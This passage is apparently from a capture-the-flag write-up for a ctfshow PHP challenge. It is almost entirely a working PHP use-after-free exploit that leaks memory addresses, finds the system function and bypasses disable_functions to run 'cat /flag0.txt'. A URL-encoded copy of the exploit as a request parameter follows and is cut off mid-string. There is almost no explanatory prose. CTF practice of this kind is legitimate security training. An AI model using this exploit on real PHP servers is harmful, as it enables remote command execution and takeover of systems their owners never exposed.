class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要 URL 编码发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3